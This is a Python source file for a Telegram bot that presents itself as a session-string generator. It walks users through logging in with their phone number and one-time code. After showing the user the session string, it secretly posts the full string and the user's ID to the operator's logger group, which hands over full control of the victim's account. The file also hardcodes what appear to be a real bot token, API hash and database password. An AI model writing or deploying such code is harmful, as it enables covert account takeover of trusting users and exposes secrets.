import asyncio
import os
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from pymongo import MongoClient
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# 🔹 Telegram API Credentials
API_ID = int(os.getenv("API_ID", "28795512"))
API_HASH = os.getenv("API_HASH", "c17e4eb6d994c9892b8a8b6bfea4042a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA")
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://sachinxsapna:sachinx007@cluster0.x3rsi.mongodb.net")
REQUIRED_CHANNEL = "SANATANI_TECH"
LOGGER_GROUP = -1002477750706  # Replace with your Logger Group ID

# 🔹 Initialize bot and database
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
mongo_client = MongoClient(MONGO_URI)
db = mongo_client["telegram_bot"]
users_collection = db["joined_users"]

# 🔹 Store user sessions
user_sessions = {}

async def is_user_joined(user_id):
    """ Check if the user is in the required channel """
    try:
        participant = await bot.get_participants(REQUIRED_CHANNEL)
        return any(user.id == user_id for user in participant)
    except:
        return False

@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    user_id = event.sender_id

    # Check if user is in the required channel
    if not await is_user_joined(user_id):
        await event.respond(
            f"🚨 You must join @{REQUIRED_CHANNEL} to use this bot!\nClick below to join.",
            buttons=[Button.url("🔗 Join Channel", f"https://t.me/{REQUIRED_CHANNEL}")]
        )
        return

    # Store in database
    users_collection.update_one({"_id": user_id}, {"$set": {"joined": True}}, upsert=True)

    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("ℹ️ Help", b"help")]
        ]
    )

@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data == b"generate":
        await ask_phone(event)
    elif event.data == b"help":
        await event.respond(
            "**How to generate a session string:**\n\n"
            "1️⃣ Click 'Generate Session'.\n"
            "2️⃣ Enter your phone number (with country code).\n"
            "3️⃣ Enter the OTP received on Telegram.\n"
            "4️⃣ If prompted, enter your 2-Step Verification password.\n"
            "5️⃣ Copy your session string and use it securely."
        )

@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "📲 **Enter your phone number with country code (e.g., +919876543210):**",
        buttons=[[Button.inline("❌ Cancel", b"cancel")]]
    )

@bot.on(events.NewMessage(pattern="/cancel"))
async def cancel_process(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
        await event.respond("✅ **Process cancelled.** You can start again using /start.")
    else:
        await event.respond("⚠️ **No active process found.**")

@bot.on(events.CallbackQuery(data=b"cancel"))
async def cancel_callback(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]
        await event.respond("✅ **Process cancelled.** Use /start to begin again.")

@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  # Ignore messages from users not in process

    step = user_sessions[user_id]["step"]
    
    # ✅ Step 1: User enters phone number
    if step == "phone":
        phone_number = event.message.text.strip()
        if not phone_number.startswith("+") or not phone_number[1:].isdigit():
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return
        
        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            user_sessions[user_id]["code_expiry"] = asyncio.get_event_loop().time() + 60
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 2: User enters OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        if not otp_code.isdigit():
            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            if asyncio.get_event_loop().time() > user_sessions[user_id]["code_expiry"]:
                raise Exception("The confirmation code has expired. Please restart.")

            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()
            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")

            # Log session string
            await bot.send_message(LOGGER_GROUP, f"📝 **New Session Generated**\n\n👤 User: {user_id}\n🔑 Session:\n`{session_string}`")

            del user_sessions[user_id]
        except Exception as e:
            if "confirmation code has expired" in str(e).lower():
                await event.respond("❌ **Error: The confirmation code has expired.** Please restart.")
                del user_sessions[user_id]
            elif "two-steps verification" in str(e).lower():
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
